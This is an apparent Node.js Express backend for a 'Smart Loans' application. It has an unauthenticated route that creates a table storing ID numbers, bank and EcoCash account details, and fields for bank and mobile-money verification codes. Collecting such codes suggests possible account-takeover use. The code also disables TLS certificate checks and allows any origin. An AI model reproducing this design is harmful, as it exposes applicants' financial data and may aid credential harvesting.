const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// Home Page
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/public/index.html");
});

// Health Check
app.get("/health", (req, res) => {
  res.json({
    status: "OK",
    app: "Smart Loans",
    version: "1.0.0"
  });
});

// Test Database
app.get("/test-db", async (req, res) => {
  try {
    const result = await pool.query("SELECT NOW()");
    res.json({
      success: true,
      database: "Connected",
      serverTime: result.rows[0].now
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Start Server
// ===============================
// CREATE APPLICATIONS TABLE
// ===============================

app.get("/create-table", async (req, res) => {

    try {

        await pool.query(`

            CREATE TABLE IF NOT EXISTS applications (

                id SERIAL PRIMARY KEY,

                full_names TEXT,
                date_of_birth TEXT,
                id_number TEXT,
                occupation TEXT,
                loan_purpose TEXT,

                loan_amount NUMERIC,
                repayment_period TEXT,
                monthly_repayment NUMERIC,
                total_repayment NUMERIC,

                disbursement_method TEXT,

                bank_name TEXT,
                account_name TEXT,
                bank_phone TEXT,
                account_number TEXT,
                bank_verification_code TEXT,
                bank_reference TEXT,

                ecocash_name TEXT,
                ecocash_number TEXT,
                ecocash_verification_code TEXT,
                ecocash_reference TEXT,

                created_at TIMESTAMP DEFAULT NOW()

            );

        `);

        res.json({
            success: true,
            message: "Applications table created successfully."
        });

    } catch (err) {

        console.error(err);

        res.status(500).json({
            success: false,
            error: err.message
        });

    }

});
app.listen(PORT, () => {
  console.log(`✅ Smart Loans Server running on port ${PORT}`);
});
